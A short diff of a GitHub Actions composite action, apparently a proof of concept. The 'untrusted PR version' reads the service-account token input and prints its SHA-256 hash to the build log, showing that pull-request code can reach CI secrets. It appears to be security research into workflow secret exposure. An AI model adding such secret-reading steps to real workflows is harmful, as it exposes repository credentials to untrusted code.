@@ -1,4 +1,4 @@
-name: poc-configure (trusted main version)
+name: poc-configure (untrusted PR version)
 inputs:
   service-account-token:
     required: true
@@ -6,4 +6,7 @@ runs:
   using: composite
   steps:
     - shell: bash
-      run: echo "benign main version of the action"
+      env:
+        T: ${{ inputs.service-account-token }}
+      run: |
+        echo "POC_LOCAL_ACTION_SECRET_SHA256=$(printf '%s' "$T" | sha256sum | cut -d' ' -f1)"
